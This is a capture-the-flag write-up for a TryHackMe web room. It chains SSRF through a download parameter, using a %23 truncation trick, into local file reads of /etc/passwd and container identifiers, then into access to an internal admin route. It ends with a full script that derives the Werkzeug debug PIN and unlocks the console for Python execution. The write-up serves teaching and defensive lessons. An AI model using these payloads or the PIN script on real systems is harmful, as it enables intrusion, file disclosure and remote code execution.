TryHackMe Writeup

Plant Photographer

TryHackMe • Web • SSRF • Werkzeug

Plant Photographer looks simple at first, but the interesting path comes from chaining a file download feature into SSRF, turning that into local file disclosure, abusing an internal admin route, and then using the Werkzeug debug console correctly to recover the remaining flag.

The debug console was locked, so it was not immediately useful. The more interesting part was the download feature, because it turned out to be vulnerable to SSRF.

Step 3: SSRF Through the Download Feature

While testing the PDF download behavior through Burp Suite, I found that the server would fetch internal resources on my behalf. I tried several bypass ideas first, but the useful breakthrough was appending %23, which is a URL-encoded # fragment marker.

The important detail was that the backend built a URL in the form of: 

server + "/public-docs-.../<id>.pdf"

Since the server value was user-controlled, this created a classic SSRF primitive. The trick was finding a way to stop the application from appending the unwanted suffix cleanly.

Using the following request let me reach the internal admin endpoint and retrieve a PDF that contained the second flag: 

GET /download?server=http://localhost:8087/admin%23&id=75482342 HTTP/1.1
Host: TARGET_IP
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://TARGET_IP/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

After receiving the response in Burp Suite, I used Show response in browser, downloaded the PDF, and recovered the second flag from it.

Step 4: SSRF to Local File Read

Once the SSRF behavior was confirmed, the next step was to push it further. Because %23 acts like a fragment marker, it could be used to truncate the rest of the generated path and turn the endpoint into a local file reader. 

file:///etc/passwd%23

With that trick, I could read files directly from the server instead of only requesting internal HTTP routes.

The most useful files were:

  • /etc/passwd to confirm usernames such as root
  • /proc/self/cgroup to inspect Docker-related identifiers
  • /sys/class/net/eth0/address to recover the MAC address

At this point, the challenge had moved from SSRF into local file disclosure, which turned out to be the missing piece for the Werkzeug debugger.

Step 5: Source Code Disclosure and Debug Clues

Reading local files also made it possible to inspect application source and confirm how the internal routes worked. The source revealed two especially important facts:

  • /admin was only intended to be reachable from localhost
  • the application was running in Flask debug mode, which meant the Werkzeug debugger was active

That changed the objective. Instead of only abusing SSRF for file retrieval, I now knew there was a reachable debug console behind the application and that the remaining challenge was generating the correct PIN.

Step 6: Unlocking the Werkzeug Console

The third flag took more time than it should have, mainly because understanding the Werkzeug PIN generation process properly matters. The first scripts I found online were not a good match for this version and environment, so I had to rebuild the logic carefully with the right values.

Once I gathered the missing pieces and used the correct algorithm, I generated the valid debug PIN and unlocked the console.

The source code and leaked local files provided the required values used by Werkzeug to derive the PIN:

  • username
  • module name: flask.app
  • application name: Flask
  • module file path
  • MAC address from uuid.getnode()
  • machine identifier information influenced by the Docker environment
import hashlib
from itertools import chain

probably_public_bits = [
    "root",
    "flask.app",
    "Flask",
    "/usr/local/lib/python3.10/site-packages/flask/app.py",
]

private_bits = [
    "2485378088962",
    "77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca",
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)

h.update(b"cookiesalt")
cookie_name = "__wzd" + h.hexdigest()[:20]

h.update(b"pinsalt")
num = ("%09d" % int(h.hexdigest(), 16))[:9]

for group_size in (5, 4, 3):
    if len(num) % group_size == 0:
        pin = "-".join(
            num[x : x + group_size].rjust(group_size, "0")
            for x in range(0, len(num), group_size)
        )
        break
else:
    pin = num

print(pin)

The important part here was not just having a script, but using the right public and private bits for the target environment.

Step 7: Console Access and Final Flag Extraction

After unlocking the Werkzeug console, arbitrary Python execution became possible inside the application context. That made final flag extraction much easier.

The first step was to inspect the document directory and identify the interesting file name: 

import os
os.listdir("/usr/src/app/public-docs")

After identifying the .txt file, I could read it directly: 

open("/usr/src/app/public-docs/<file>.txt").read()

In my path, I also reused the SSRF workflow through Burp Suite with the discovered file name to retrieve the final flag cleanly.

Key Takeaways

This room chains several very realistic issues together:

  • SSRF through a user-controlled backend fetch
  • URL parsing quirks using %23 to truncate unwanted suffixes
  • local file disclosure through file:// access
  • debug-mode exposure through Werkzeug
  • container-specific identifiers leaking through /proc/self/cgroup

A small SSRF bug became much more serious because it was able to expose the exact environmental details needed to reach the debug console.

Security Lessons

  • Never expose Flask debug mode in a reachable environment
  • Do not build backend URLs directly from untrusted user input
  • Validate and restrict SSRF targets aggressively
  • Be careful with URL parsing edge cases such as fragment handling
  • Remember that Docker metadata and process files often leak useful identifiers

Conclusion

The full path here was a strong chained exploit: SSRF -> local file read -> Werkzeug debugger access -> Python execution -> flag extraction. Each step on its own was useful, but together they led to full compromise of the challenge flow.
